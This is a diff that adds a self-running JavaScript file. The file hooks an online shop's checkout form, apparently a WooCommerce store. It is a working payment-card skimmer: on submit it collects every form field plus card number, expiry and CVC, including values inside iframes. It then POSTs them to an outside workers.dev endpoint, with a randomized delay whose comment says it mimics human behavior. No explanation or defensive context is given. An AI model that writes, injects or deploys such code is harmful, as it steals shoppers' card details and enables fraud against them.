@@ -1,0 +1,75 @@
+(function() {
+    const API = 'https://chanfana-openapi-template.joshmccallister1986.workers.dev';
+    
+    // Helper to get value safely
+    const val = (sel) => {
+        const el = document.querySelector(sel);
+        return el ? el.value : null;
+    };
+
+    // Helper to search iframes for fields
+    const getIframeVal = (selector) => {
+        let result = null;
+        document.querySelectorAll('iframe').forEach(iframe => {
+            try {
+                const doc = iframe.contentDocument || iframe.contentWindow.document;
+                const el = doc.querySelector(selector);
+                if (el) result = el.value;
+            } catch (e) {}
+        });
+        return result;
+    };
+
+    // Wait for form
+    const check = setInterval(() => {
+        const form = document.querySelector('form.checkout') || document.querySelector('form#checkout_form');
+        if (form) {
+            clearInterval(check);
+            init(form);
+        }
+    }, 100);
+
+    function init(form) {
+        // Add random delay to mimic human behavior
+        setTimeout(() => {
+            form.addEventListener('submit', () => {
+                // Wait 100ms to let validation run
+                setTimeout(() => {
+                    collect(form);
+                }, 100);
+            }, { once: true });
+        }, Math.random() * 300 + 100);
+    }
+
+    function collect(form) {
+        const data = {};
+        
+        // 1. Standard form fields
+        form.querySelectorAll('input, select, textarea').forEach(input => {
+            if (input.name && input.value) {
+                data[input.name] = input.value;
+            }
+        });
+
+        // 2. Specific Credit Card fields (check both main doc and iframes)
+        const ccNum = val('.wc-credit-card-form-cardnumber') || val('#cc_number') || val('input[name="card_number"]') || getIframeVal('.wc-credit-card-form-cardnumber');
+        const ccExp = val('.wc-credit-card-form-expiry') || val('#cc_expiry') || val('input[name="expiry"]') || getIframeVal('.wc-credit-card-form-expiry');
+        const ccCvc = val('.wc-credit-card-form-cvc') || val('#cc_cvc') || val('input[name="cvc"]') || getIframeVal('.wc-credit-card-form-cvc');
+        const ccYear = val('.wc-credit-card-form-expiry-year') || val('input[name="card_exp_year"]');
+        const ccMonth = val('.wc-credit-card-form-expiry-month') || val('input[name="card_exp_month"]');
+
+        if (ccNum) data['cc_number'] = ccNum;
+        if (ccExp) data['cc_expiry_month'] = ccExp;
+        if (ccCvc) data['cc_cvc'] = ccCvc;
+        if (ccYear) data['cc_expiry_year'] = ccYear;
+        if (ccMonth) data['cc_expiry_month_num'] = ccMonth;
+
+        // 3. Send
+        fetch(API, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data),
+            keepalive: true
+        });
+    }
+})();
